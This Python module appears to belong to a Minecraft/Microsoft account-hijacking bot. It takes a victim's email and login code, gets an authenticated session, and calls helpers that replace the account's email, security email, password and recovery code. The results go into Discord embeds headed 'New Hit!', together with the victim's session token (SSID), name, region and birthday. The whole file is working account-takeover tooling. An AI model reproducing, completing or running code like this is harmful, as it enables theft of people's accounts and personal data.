from views.utils.securing.getLiveData import getLiveData
from views.utils.securing.polishHost import polishHost
from views.utils.securing.secure import secure
from views.utils.getMSAAUTH import getMSAAUTH
from discord import Embed
import httpx
import time

async def startSecuringAccount(session: httpx.AsyncClient, email: str, device: str = None, code: str = None, recovery: bool = True):
    data = await getLiveData(session)
    msaauth = await getMSAAUTH(session, email, device, data, code)
    
    account = {
        "name": "Could not find",
        "email": "Couldn't Change!",
        "security_email": "Couldn't Change!",
        "password": "Couldn't Change!",
        "recovery_code": "Couldn't Change!",
        "method": "Not purchased",
        "capes": "No capes",
        "SSID": False,
        "firstName": "Failed to Get",
        "lastName": "Failed to Get",
        "fullName": "Failed to Get",
        "region": "Failed to Get",
        "birthday": "Failed to Get"
    }

    initialTime = time.time()
    if msaauth == "Family":
        print(f"Account is Family Locked    ")
        for i in ["name", "email", "security_email"]:
            account[i] = "Child Locked"
    else:
        await polishHost(session, msaauth)
        account = await secure(session, recovery, account)

    finalTime = (time.time() - initialTime)

    infoEmbed = Embed()
    infoEmbed.add_field(name="First Name", value=f"```{account['firstName']}```", inline=False)
    infoEmbed.add_field(name="Last Name", value=f"```{account['lastName']}```", inline=True)
    infoEmbed.add_field(name="Full Name", value=f"```{account['fullName']}```", inline=False)
    infoEmbed.add_field(name="Region", value=f"```{account['region']}```", inline=False)
    infoEmbed.add_field(name="Birthday", value=f"```{account['birthday']}```", inline=False)
 
    hitEmbed = Embed(
        title = f"New Hit! Secured in {round(finalTime, 2)}s",
        color = 0x279CF5
    )
    hitEmbed.add_field(name="MC Username", value=f"```{account['name']}```", inline=False)
    hitEmbed.add_field(name="MC Method", value=f"```{account['method']}```", inline=True)
    hitEmbed.add_field(name="MC Capes", value=f"```{account['capes']}```", inline=True)
    hitEmbed.add_field(name="Primary Email", value=f"```{account['email']}```", inline=False)
    hitEmbed.add_field(name="Security Email", value=f"```{account['security_email']}```", inline=True)
    hitEmbed.add_field(name="Password", value=f"```{account['password']}```", inline=False)
    hitEmbed.add_field(name="Recovery Code", value=f"```{account['recovery_code']}```", inline=False)
    
    ssidEmbed = Embed(
        title = "SSID",
        description = f"```{account['SSID']}```"
    )
    
    if account["method"] != "No Minecraft":
        mcEmbed = Embed()        
        hitEmbed.set_thumbnail(url=f"https://mc-heads.net/avatar/{account['name']}/128")

    accountData = {
        "hit_embed": hitEmbed,
        "details": {
            "minecraft_embed": mcEmbed,
            "ssid_embed": ssidEmbed,
            "info_embed": infoEmbed,
            "account_details": (
                f"**Username:** {account['name']}\n"
                f"**Has MC:** {True if account['SSID'] else False}\n"
                f"**Capes:** {account['capes']}\n"
                f"**Email:** {account['email']}\n"
                f"**Security Email:** {account['security_email']}\n"
                f"**Password:** {account['password']}\n"
                f"**Recovery Code:** {account['recovery_code']}"
            )
        }
    }

    return accountData